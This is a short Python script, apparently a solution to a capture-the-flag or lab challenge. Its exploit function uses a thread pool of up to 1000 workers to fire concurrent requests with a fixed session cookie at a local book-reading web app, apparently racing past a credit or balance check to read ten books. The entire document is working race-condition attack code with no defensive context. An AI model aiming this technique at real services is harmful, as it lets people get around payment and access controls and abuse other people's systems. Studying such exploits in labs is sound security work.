import requests
from concurrent.futures import ThreadPoolExecutor

def exploit(book):
  r = requests.get(f'http://127.0.0.1:5000/read?book={book}&size=16&theme=light', cookies={'session': '082340bc08e342388b8bfca155b40d0f'}).text
  print('Insufficient' if 'Insufficient' in r else 'Success')


books = [
    'rj1',
    'rj2',
    'rj3',
    'rj4',
    'rj5',
    'mb1',
    'mb2',
    'mb3',
    'mb4',
    'mb5'
]

MAX_THREADS = 1000

with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
    executor.map(exploit, books)
